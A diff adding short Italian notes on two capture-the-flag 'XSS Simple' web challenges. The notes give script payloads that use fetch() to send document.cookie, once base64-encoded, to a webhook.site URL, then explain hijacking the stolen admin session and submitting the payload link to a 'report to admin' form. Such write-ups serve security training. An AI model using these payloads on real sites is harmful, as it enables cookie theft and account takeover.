@@ -1,0 +1,30 @@
+-> WS_3.01 - XSS Simple 1
+
+Creati un hook:
+                https://webhook.site/
+
+E poi inserisci questo script dentro il form:
+
+<script>
+    fetch('Tuo_URL_Webhook?c=' + document.cookie);
+</script>
+
+Dovresti vedere nei cookie la flag, se non sono presenti i cookie leggi la sessione.
+
+!Se ci sono le sessioni, fai cosi:
+Se trovi questo, devi fare "Session Hijacking":
+
+    -Torna sul sito della sfida.
+    -Apri gli Strumenti per Sviluppatori del tuo browser (F12) e vai nella tab Storage (o Archiviazione) -> Cookies.
+    -Modifica il valore del tuo cookie attuale con quello che hai appena rubato.
+    -Ricarica la pagina. Se tutto è andato a buon fine, il sito ti riconoscerà come "Admin" e potrai visualizzare la flag nascosta nel pannello di amministrazione.
+
+!?Come ho risolto la challenge:
+Copia l'Indirizzo in alto nella barra degli indirizzi del tuo browser. Dovresti avere un URL lungo che contiene il tuo payload (codifica con caratteri come %3Cscript%3E...). Copia tutto quell'URL.
+E poi vai nel form "Report an url to the admin" e incolla l'URL lunghissimo che hai appena copiato. Torna sul sito hook e prenditi la flag
+
+-> WS_3.02 - XSS Simple 2
+
+"><script>fetch('https://webhook.site/TUO_ID?c=' + btoa(document.cookie))</script>
+
+Copia l'url e lo metti nel report, e poi vai sull'hook e prenditi la stringa c. Sarà in base64, fai cosi da terminale: echo "valoreDellaStringa" | base64 -d
